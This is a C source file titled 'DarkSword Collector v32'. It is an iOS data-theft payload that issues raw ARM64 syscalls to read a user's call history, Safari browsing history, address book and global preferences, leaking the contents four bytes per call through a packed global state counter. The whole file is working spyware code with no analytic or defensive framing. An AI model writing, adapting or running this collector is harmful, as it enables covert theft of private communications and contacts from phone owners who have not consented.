/**
 * DarkSword Collector v32 - Single static volatile for state+offset
 * g_ctx: bits 0-15 = offset, bits 16-23 = file_id, bit 31 = init flag
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory"); return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory"); return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory"); return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory"); return x0;
}

#define SYS_open 5
#define SYS_read 3
#define SYS_close 6
#define SYS_lseek 199
#define SEEK_SET 0
#define O_RDONLY 0
#define NUM_FILES 5
#define MAX_OFF 200

static volatile int g_ctx = 0;

static const char *get_path(int id) {
    switch (id) {
        case 0: return "/etc/hosts";
        case 1: return "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
        case 2: return "/var/mobile/Library/Safari/History.db";
        case 3: return "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
        case 4: return "/var/mobile/Library/Preferences/.GlobalPreferences.plist";
        default: return (void*)0;
    }
}

int ds_start(void) {
    int ctx = g_ctx;
    int fid = (ctx >> 16) & 0xFF;
    int off = ctx & 0xFFFF;

    if (fid >= NUM_FILES) { g_ctx = 0; return 0xFFFFFFFF; }

    const char *path = get_path(fid);
    if (!path) { g_ctx = ((fid + 1) << 16); return 0xFD000000 | fid; }

    int fd = (int)_svc2(SYS_open, (long)path, O_RDONLY);
    if (fd < 0) { g_ctx = ((fid + 1) << 16); return 0xFE000000 | fid; }

    if (off > 0) _svc4(SYS_lseek, fd, (long)off, SEEK_SET, 0);
    unsigned char buf[4] = {0};
    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
    _svc1(SYS_close, fd);

    if (n < 1 || off >= MAX_OFF) {
        g_ctx = ((fid + 1) << 16);
        return 0xFF000000 | fid;
    }

    g_ctx = (fid << 16) | (off + n);
    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
}
